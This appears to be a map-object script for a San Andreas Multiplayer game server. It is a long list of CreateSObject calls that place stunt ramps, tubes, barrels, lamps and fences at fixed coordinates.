	CreateSObject(18809, -1218.91003, -374.12000, 52.42000,   0.00000, -91.00000, 82.76000);
	CreateSObject(18811, -1222.84998, -423.64999, 52.50000,   0.00000, -91.00000, 267.38000);
	CreateSObject(18822, -1230.26001, -469.98001, 56.06000,   -69.00000, -62.00000, 95.30000);
	CreateSObject(18822, -1260.17004, -502.70999, 68.63000,   -69.00000, -19.00000, 95.00000);
	CreateSObject(18809, -1303.53003, -511.45001, 86.92000,   0.00000, -66.00000, 3.54000);
	CreateSObject(18809, -1353.39001, -514.83002, 93.86000,   0.00000, -98.00000, 4.00000);
	CreateSObject(18809, -1401.81006, -518.46002, 87.04000,   0.00000, -98.00000, 4.41000);
	CreateSObject(18818, -1548.01001, -487.75000, 70.98000,   89.00000, 0.00000, 338.17001);
	CreateSObject(18809, -1449.93994, -522.22998, 80.24000,   0.00000, -98.00000, 4.41000);
	CreateSObject(18822, -1497.54004, -518.84003, 75.35000,   -84.00000, -120.00000, 311.92999);
	CreateSObject(18802, -1525.94995, -504.85001, 66.72000,   0.00000, 0.00000, 331.89001);
	CreateSObject(18809, -1597.09998, -476.76999, 73.65000,   -8.00000, -84.00000, 339.56000);
	CreateSObject(18826, -1636.03003, -477.92999, 76.61000,   -98.00000, -113.00000, 221.75000);
	CreateSObject(18826, -1635.32996, -514.77002, 76.71000,   -97.00000, -127.00000, 18.00000);
	CreateSObject(18824, -1661.19995, -502.50000, 78.79000,   -84.00000, -32.00000, 341.34000);
	CreateSObject(18809, -1648.69995, -459.25000, 83.13000,   0.00000, -85.00000, 238.73000);
	CreateSObject(18826, -1630.15002, -429.00000, 101.24000,   -178.00000, -360.00000, 234.71001);
	CreateSObject(18826, -1655.19995, -438.29001, 115.59000,   -265.00000, -178.00000, 239.59000);
	CreateSObject(18809, -1653.44995, -399.54001, 113.71000,   0.00000, -91.00000, 244.14000);
	CreateSObject(18809, -1631.97998, -355.38000, 112.81000,   0.00000, -91.00000, 244.14000);
	CreateSObject(18809, -1610.31006, -311.00000, 111.90000,   0.00000, -91.00000, 244.14000);
	CreateSObject(18809, -1588.90002, -266.66000, 110.90000,   0.00000, -91.00000, 244.14000);
	CreateSObject(18826, -1574.56995, -234.84000, 94.83000,   -178.00000, -178.00000, 66.72000);
	CreateSObject(18826, -1597.63000, -246.45000, 77.23000,   -265.00000, -178.00000, 243.32001);
	CreateSObject(18809, -1599.56995, -209.11000, 81.43000,   0.00000, -77.00000, 249.25000);
	CreateSObject(18826, -1585.02002, -164.96001, 75.53000,   -215.00000, -11.00000, 236.00000);
	CreateSObject(18826, -1615.79004, -180.25999, 78.18000,   -193.00000, -11.00000, 47.35000);
	CreateSObject(18809, -1593.45996, -149.59000, 88.06000,   0.00000, -98.00000, 230.39999);
	CreateSObject(18826, -1567.18994, -130.45000, 98.58000,   -215.00000, -11.00000, 244.30000);
	CreateSObject(18826, -1558.94995, -163.05000, 111.40000,   -265.00000, -149.00000, 202.22000);
	CreateSObject(18822, -1519.20996, -152.03000, 111.11000,   62.00000, -91.00000, 26.24000);
	CreateSObject(18822, -1478.76001, -146.85001, 114.89000,   69.00000, -113.00000, 9.78000);
	CreateSObject(18809, -1435.52002, -165.23000, 125.32000,   0.00000, -105.00000, 331.00000);
	CreateSObject(18809, -1393.68994, -188.42999, 138.14999,   0.00000, -105.00000, 331.00000);
	CreateSObject(18809, -1351.68005, -211.67000, 150.92000,   0.00000, -105.00000, 331.16000);
	CreateSObject(18813, -1306.63000, -250.69000, 125.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(8355, -1278.17004, -166.67999, 11.38000,   -25.00000, 0.00000, 136.99001);
	CreateSObject(8355, -1195.10999, -76.21000, 68.62000,   -25.00000, 0.00000, 137.82001);
	CreateSObject(8344, -1126.25000, 32.31000, 96.51000,   0.00000, 0.00000, 136.48000);
	CreateSObject(3278, -1208.25000, -70.71000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1206.32996, -72.34000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1204.34998, -73.93000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1202.43005, -75.55000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1200.69995, -76.84000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1198.68005, -78.30000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1196.64001, -79.83000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1194.73999, -81.22000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1192.77002, -82.65000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1190.79004, -84.11000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1188.79004, -85.59000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(3278, -1186.81006, -87.01000, 68.40000,   0.00000, 0.00000, 324.01001);
	CreateSObject(2780, -1146.13000, -38.43000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1149.31995, -35.45000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1151.46997, -33.41000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1154.59998, -31.14000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1157.12000, -28.72000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1159.60999, -26.51000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1162.09998, -24.23000, 97.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1985, -1150.87000, -34.65000, 100.25000,   0.00000, 0.00000, 0.14000);
	CreateSObject(1985, -1148.72998, -37.35000, 100.25000,   0.00000, 0.00000, 0.14000);
	CreateSObject(1985, -1156.27002, -30.33000, 100.25000,   0.00000, 0.00000, 0.14000);
	CreateSObject(1985, -1153.32996, -32.73000, 100.25000,   0.00000, 0.00000, 0.14000);
	CreateSObject(1985, -1159.03003, -28.39000, 100.25000,   0.00000, 0.00000, 0.14000);
	CreateSObject(1985, -1161.76001, -26.40000, 100.25000,   0.00000, 0.00000, 0.14000);
	CreateSObject(8171, -1190.60999, 113.69000, 96.18000,   0.00000, 0.00000, 248.39000);
	CreateSObject(8171, -1301.10999, 157.39999, 96.08000,   0.00000, 0.00000, 248.39000);
	CreateSObject(3761, -1242.00000, 124.15000, 98.03000,   0.00000, 0.00000, 345.00000);
	CreateSObject(3761, -1237.60999, 136.89999, 98.03000,   0.00000, 0.00000, 346.82999);
	CreateSObject(3761, -1230.43005, 126.91000, 98.03000,   0.00000, 0.00000, 345.00000);
	CreateSObject(13666, -1353.52002, 184.99001, 101.00000,   0.00000, 0.00000, 69.67000);
	CreateSObject(18778, -1359.84998, 172.75999, 97.52000,   0.00000, 0.00000, 66.89000);
	CreateSObject(13604, -1154.78003, 93.86000, 97.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18808, -1428.25000, -112.17000, 24.77000,   0.00000, -72.00000, 12.29000);
	CreateSObject(18808, -1474.06995, -122.25000, 39.99000,   0.00000, -72.00000, 12.49000);
	CreateSObject(18808, -1518.73999, -132.14000, 54.87000,   0.00000, -72.00000, 12.49000);
	CreateSObject(18808, -1572.06995, -144.58000, 96.20000,   0.00000, -62.00000, 13.00000);
	CreateSObject(18825, -1605.79004, -149.87000, 93.46000,   0.00000, 0.00000, 5.72000);
	CreateSObject(987, -1596.35999, -143.53999, 73.16000,   -105.00000, 0.00000, 284.00000);
	CreateSObject(18808, -1562.65002, -142.10001, 69.52000,   0.00000, -72.00000, 13.08000);
	CreateSObject(18821, -1619.77002, -199.02000, 52.64000,   62.00000, -81.00000, 39.72000);
	CreateSObject(18808, -1646.05005, -233.67000, 60.84000,   0.00000, -105.00000, 235.00000);
	CreateSObject(18823, -1661.93005, -275.00000, 72.59000,   76.00000, 0.00000, 8.54000);
	CreateSObject(18823, -1646.12000, -316.57001, 83.58000,   105.00000, 4.00000, 181.60001);
	CreateSObject(18823, -1651.52002, -361.10001, 94.07000,   78.00000, 0.00000, 8.20000);
	CreateSObject(18825, -1635.77002, -389.28000, 114.15000,   -11.00000, 0.00000, 151.39999);
	CreateSObject(18825, -1659.88000, -384.79999, 118.12000,   -20.00000, 17.00000, 333.25000);
	CreateSObject(18825, -1658.01001, -410.20001, 95.63000,   -72.00000, -156.00000, 353.51001);
	CreateSObject(18825, -1698.47998, -416.01001, 94.71000,   -273.00000, -25.00000, 339.19000);
	CreateSObject(18808, -1687.60999, -453.95001, 97.04000,   0.00000, -93.00000, 307.66000);
	CreateSObject(18808, -1657.77002, -492.67999, 99.58000,   0.00000, -93.00000, 307.66000);
	CreateSObject(18821, -1624.27002, -528.03998, 101.32000,   93.00000, -98.00000, 153.10001);
	CreateSObject(18821, -1579.28003, -543.41998, 101.61000,   93.00000, -98.00000, 184.95000);
	CreateSObject(18808, -1538.18005, -542.20001, 115.29000,   0.00000, -55.00000, 183.59000);
	CreateSObject(18808, -1499.93005, -539.67999, 141.82001,   0.00000, -55.00000, 183.59000);
	CreateSObject(18808, -1459.15002, -537.39001, 170.35001,   0.00000, -55.00000, 183.59000);
	CreateSObject(18808, -1418.59998, -534.90997, 198.82001,   0.00000, -55.00000, 183.59000);
	CreateSObject(18808, -1379.83997, -532.46002, 225.99001,   0.00000, -55.00000, 183.59000);
	CreateSObject(18808, -1339.58997, -529.97998, 254.23000,   0.00000, -55.00000, 183.59000);
	CreateSObject(18815, -1292.02002, -524.12000, 238.44000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1317.56006, -275.31000, 21.09000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1283.50000, -261.60001, 21.19000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1398.59998, -217.89000, 24.07000,   0.00000, 0.00000, 1.32000);
	CreateSObject(18648, -1372.33997, -156.53999, 23.54000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18651, -1312.22998, -275.35999, 24.69000,   0.00000, 0.00000, 0.42000);
	CreateSObject(18651, -1336.73999, -283.79999, 23.43000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18651, -1398.06995, -224.33000, 24.81000,   0.00000, 0.00000, 0.17000);
	CreateSObject(18651, -1382.54004, -170.08000, 30.35000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3528, -1355.04004, -286.92999, 22.56000,   0.00000, 4.00000, 33.00000);
	CreateSObject(3528, -1400.94995, -239.78000, 22.56000,   0.00000, 4.00000, 40.00000);
	CreateSObject(18772, -1470.88000, -639.21002, 103.68000,   -16.00000, 0.00000, 108.40000);
	CreateSObject(18777, -1366.06995, -625.67999, 62.37000,   11.00000, 0.00000, 111.91000);
	CreateSObject(18777, -1359.34998, -622.78003, 87.36000,   11.00000, 0.00000, 110.90000);
	CreateSObject(18777, -1353.96997, -620.58002, 112.68000,   11.00000, 0.00000, 110.90000);
	CreateSObject(18772, -1277.03003, -532.03998, 38.46000,   11.00000, 0.00000, 127.84000);
	CreateSObject(18752, -1612.10999, -678.06000, -10.13000,   0.00000, 0.00000, 23.22000);
	CreateSObject(18801, -1298.75000, -517.45001, 35.95000,   0.00000, 0.00000, 38.78000);
	CreateSObject(18779, -1318.65002, -525.07001, 23.02000,   0.00000, 0.00000, 29.69000);
	CreateSObject(18779, -1477.37000, 2.75000, 23.54000,   0.00000, 0.00000, 311.89999);
	CreateSObject(18779, -1487.48999, 14.22000, 42.45000,   0.00000, 40.00000, 311.32001);
	CreateSObject(18779, -1486.35999, 12.88000, 67.93000,   0.00000, 85.00000, 311.00000);
	CreateSObject(18771, -1414.19995, -234.10001, 32.10000,   0.00000, 0.00000, 2.19000);
	CreateSObject(18771, -1414.20996, -234.12000, 32.10000,   0.00000, 0.00000, 2.19000);
	CreateSObject(18771, -1414.20996, -234.12000, 32.10000,   0.00000, 0.00000, 2.19000);
	CreateSObject(18771, -1341.75000, -304.14999, 23.67000,   0.00000, 0.00000, 0.00000);
	CreateSObject(7392, -1493.27002, 0.77000, 22.02000,   0.00000, 0.00000, 322.17001);
	CreateSObject(7392, -1467.63000, 29.11000, 22.02000,   0.00000, 0.00000, 142.00000);
	CreateSObject(18784, -1317.20996, -124.85000, 15.52000,   0.00000, 0.00000, 80.53000);
	CreateSObject(18784, -1306.50000, -65.57000, 15.36000,   0.00000, 0.00000, -98.00000);
	CreateSObject(19313, -1319.01001, -80.92000, 14.64000,   0.00000, 0.00000, 78.53000);
	CreateSObject(19313, -1321.73999, -94.64000, 14.64000,   0.00000, 0.00000, 78.53000);
	CreateSObject(19313, -1324.30005, -107.09000, 14.64000,   0.00000, 0.00000, 78.53000);
	CreateSObject(19313, -1299.48999, -83.69000, 14.64000,   0.00000, 0.00000, 78.53000);
	CreateSObject(19313, -1302.28003, -97.37000, 14.64000,   0.00000, 0.00000, 78.53000);
	CreateSObject(19313, -1304.76001, -109.80000, 14.54000,   0.00000, 0.00000, 78.53000);
	CreateSObject(1225, -1307.85999, -109.35000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1312.06006, -108.96000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1316.79004, -108.46000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1321.20996, -107.88000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1320.34998, -102.06000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1316.35999, -102.20000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1311.56006, -102.95000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1306.91003, -103.55000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1306.26001, -99.05000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1310.64001, -98.58000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1315.63000, -97.78000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1319.90002, -97.24000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1319.22998, -92.95000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1314.83997, -93.18000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1310.18994, -93.67000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1305.25000, -94.21000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1304.31995, -89.55000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1309.30005, -88.95000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1313.94995, -88.14000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1318.40002, -87.59000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1317.44995, -82.03000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1313.39001, -82.58000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1308.72998, -82.91000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1303.51001, -83.40000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1318.56995, -104.96000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1318.02002, -99.61000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1317.38000, -95.36000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1316.69995, -90.56000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1315.80005, -85.14000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1311.15002, -85.79000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1312.30005, -91.27000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1312.93005, -96.01000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1313.81995, -101.19000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1314.32996, -105.56000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1309.52002, -105.94000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1308.72998, -101.08000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1307.90002, -96.31000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1307.06995, -91.60000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(1225, -1306.10999, -86.44000, 13.69000,   0.00000, 0.00000, 359.81000);
	CreateSObject(18646, -1315.56995, -99.72000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1313.00000, -98.37000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1310.75000, -100.84000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1313.85999, -103.44000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1318.19995, -102.37000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1320.06006, -99.57000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1317.79004, -97.25000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1315.06006, -95.39000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1319.13000, -94.88000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1316.84998, -92.87000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1314.17004, -90.43000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1312.00000, -93.49000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1309.82996, -96.08000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1307.76001, -98.71000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1305.64001, -101.17000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1308.77002, -103.77000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1306.27002, -106.98000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1306.27002, -106.98000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1306.27002, -106.98000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1310.02002, -108.64000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1311.93005, -105.59000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1314.37000, -108.11000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1316.77002, -105.36000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1318.84998, -107.50000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1320.93994, -104.83000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1318.71997, -90.25000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1316.04004, -87.80000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1317.82996, -84.66000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1313.32996, -85.30000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1310.81995, -82.92000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1315.34998, -82.21000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1306.62000, -84.34000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1303.14001, -86.68000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1306.03003, -89.07000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1308.82996, -86.89000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1311.50000, -88.73000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1309.62000, -91.61000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1307.53003, -94.48000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1304.29004, -91.90000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1305.21997, -96.87000, 13.22000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1316.22998, -76.45000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1311.25000, -77.36000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1306.40002, -77.94000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1301.84998, -78.58000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1309.23999, -114.07000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1314.16003, -113.30000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1318.63000, -112.72000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1323.19995, -111.84000, 13.13000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18789, -1089.17004, -403.17001, 35.61000,   0.00000, -18.00000, 14.20000);
	CreateSObject(8040, -982.34003, -376.53000, 59.52000,   0.00000, 0.00000, 193.44000);
	CreateSObject(18779, -1013.06000, -359.32001, 67.50000,   0.00000, 0.00000, 280.00000);
	CreateSObject(18845, -1010.21002, -342.34000, 115.86000,   0.00000, 0.00000, 280.13000);
	CreateSObject(18779, -941.88000, -381.01001, 67.40000,   0.00000, 0.00000, 105.00000);
	CreateSObject(18844, -942.95001, -399.79001, 128.25000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18859, -1454.93994, -188.85001, 24.40000,   0.00000, 0.00000, 263.23999);
	CreateSObject(18859, -1464.20996, -187.75000, 63.45000,   86.00000, 0.00000, 263.32999);
	CreateSObject(16776, -1331.93994, -120.37000, 12.64000,   0.00000, 0.00000, 81.00000);
	CreateSObject(16776, -1302.09998, -125.21000, 12.64000,   0.00000, 0.00000, -99.00000);
	CreateSObject(16776, -1322.20996, -68.58000, 12.64000,   0.00000, 0.00000, 81.00000);
	CreateSObject(16776, -1292.26001, -72.00000, 12.64000,   0.00000, 0.00000, -99.00000);
	CreateSObject(2780, -1317.89001, -93.45000, 13.06000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1313.10999, -93.56000, 13.06000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1308.76001, -93.69000, 13.06000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, -1306.04004, -93.93000, 13.06000,   0.00000, 0.00000, 0.00000);
	CreateSObject(7388, -1256.43994, 26.30000, 23.25000,   0.00000, 0.00000, 351.14001);
	CreateSObject(13562, -1186.18994, -136.23000, 25.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18656, -1350.70996, -303.56000, 24.40000,   33.00000, -236.00000, 55.00000);
	CreateSObject(18656, -1418.87000, -235.52000, 24.40000,   147.00000, -120.00000, 33.00000);
	CreateSObject(18649, -1291.04004, -264.87000, 19.90000,   0.00000, 0.00000, 359.73999);
	CreateSObject(18649, -1294.13000, -273.60001, 29.79000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1300.62000, -273.69000, 25.94000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1343.91003, -285.04999, 19.24000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1407.10999, -228.74001, 25.38000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1395.54004, -204.11000, 27.10000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1388.01001, -182.28000, 29.52000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1381.71997, -162.72000, 30.14000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1280.03003, -263.35999, 24.44000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1300.21997, -273.35999, 32.80000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1307.28003, -270.45999, 20.72000,   0.00000, 0.00000, 0.54000);
	CreateSObject(18650, -1346.72998, -293.14999, 28.86000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1402.54004, -218.17999, 29.37000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1394.59998, -200.21001, 26.65000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1383.88000, -176.48000, 27.34000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1381.94995, -167.24001, 28.41000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1266.71997, -260.28000, 21.44000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1327.10999, -278.66000, 18.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1337.31995, -288.17999, 26.34000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1314.21997, -282.10999, 26.16000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1394.17004, -205.46001, 32.19000,   0.00000, 0.00000, 359.28000);
	CreateSObject(18652, -1407.68005, -228.27000, 32.98000,   0.00000, 0.00000, 1.30000);
	CreateSObject(18652, -1381.60999, -158.31000, 31.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1373.89001, -156.32001, 19.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(974, -1607.47998, -175.71001, 56.94000,   -95.00000, -47.00000, 358.06000);
	CreateSObject(974, -1602.85999, -171.19000, 56.53000,   -95.00000, -47.00000, 357.95999);
	CreateSObject(974, -1598.28003, -166.71001, 56.13000,   -95.00000, -47.00000, 357.95999);
	CreateSObject(1503, -1597.59998, -165.61000, 54.90000,   0.00000, 0.00000, 316.79001);
	CreateSObject(18821, -1529.10999, -141.11000, 76.53000,   111.00000, -193.00000, 94.67000);
	CreateSObject(18825, -1505.02002, -165.11000, 67.57000,   -86.00000, 153.00000, 310.00000);
	CreateSObject(18821, -1543.14001, -172.10001, 61.67000,   -284.00000, -135.00000, 40.70000);
	CreateSObject(18808, -1590.25000, -179.42000, 53.98000,   -54.00000, 74.00000, 2.20000);
	CreateSObject(987, -1591.75000, -142.21001, 73.16000,   -105.00000, 0.00000, 284.00000);
	CreateSObject(974, -1609.01001, -173.19000, 58.25000,   0.00000, -178.00000, 221.45000);
	CreateSObject(974, -1606.10999, -170.53000, 58.38000,   0.00000, -178.00000, 224.33000);
	CreateSObject(974, -1601.45996, -166.06000, 58.56000,   0.00000, -178.00000, 224.05000);
	CreateSObject(974, -1597.21997, -169.44000, 58.76000,   0.00000, -178.00000, 224.57001);
	CreateSObject(974, -1601.65002, -173.78000, 58.56000,   0.00000, -178.00000, 224.52000);
	CreateSObject(974, -1606.27002, -178.32001, 58.36000,   0.00000, -178.00000, 224.52000);
	CreateSObject(987, -1671.47998, -415.31000, 87.94000,   -76.00000, -134.00000, 2.00000);
	CreateSObject(987, -1681.33997, -405.42999, 84.70000,   0.00000, 0.00000, 312.97000);
	CreateSObject(987, -1684.78003, -411.57001, 83.61000,   0.00000, 0.00000, 321.45001);
	CreateSObject(18801, -1325.53003, 68.45000, 35.90000,   0.00000, 0.00000, 37.04000);
	CreateSObject(19073, -1438.94995, 96.78000, 21.10000,   16.00000, 0.00000, 45.12000);
	CreateSObject(19073, -1479.78003, 137.42999, 37.64000,   16.00000, 0.00000, 45.12000);
	CreateSObject(19073, -1519.45996, 176.88000, 53.63000,   16.00000, 0.00000, 45.22000);
	CreateSObject(19073, -1560.30005, 217.38000, 70.16000,   16.02000, 0.00000, 45.24000);
	CreateSObject(19073, -1601.05005, 257.97000, 86.69000,   16.00000, 0.00000, 44.98000);
	CreateSObject(8040, -1649.09998, 305.42999, 95.60000,   0.00000, 0.00000, 314.48999);
	CreateSObject(18779, -1617.12000, 304.26999, 91.12000,   0.00000, 0.00000, -229.00000);
	CreateSObject(18779, -1640.87000, 285.29999, 91.12000,   0.00000, 0.00000, 133.73000);
	CreateSObject(8210, -1608.63000, 251.31000, 90.64000,   2.00000, 16.00000, 314.82999);
	CreateSObject(8210, -1571.65002, 214.33000, 75.59000,   2.00000, 16.00000, 314.75000);
	CreateSObject(8210, -1534.93005, 178.05000, 60.70000,   2.00000, 16.00000, 314.75000);
	CreateSObject(8210, -1498.98999, 142.50000, 46.23000,   2.00000, 16.00000, 314.75000);
	CreateSObject(8210, -1461.56006, 105.14000, 30.86000,   2.00000, 16.00000, 313.95001);
	CreateSObject(8210, -1440.40002, 83.56000, 22.19000,   2.00000, 16.00000, 314.10001);
	CreateSObject(8210, -1592.21997, 263.47000, 89.83000,   2.00000, 16.00000, 314.22000);
	CreateSObject(8210, -1555.68005, 226.75999, 75.11000,   2.00000, 16.00000, 314.22000);
	CreateSObject(8210, -1519.22998, 190.41000, 60.24000,   2.00000, 16.00000, 314.51999);
	CreateSObject(8210, -1484.48999, 155.92999, 46.17000,   2.00000, 16.00000, 314.51999);
	CreateSObject(8210, -1447.25000, 118.74000, 30.53000,   2.00000, 16.00000, 314.51999);
	CreateSObject(8210, -1425.50000, 97.05000, 21.30000,   2.00000, 16.00000, 314.32001);
	CreateSObject(18801, -1434.65002, 54.75000, 35.64000,   0.00000, 0.00000, 320.06000);
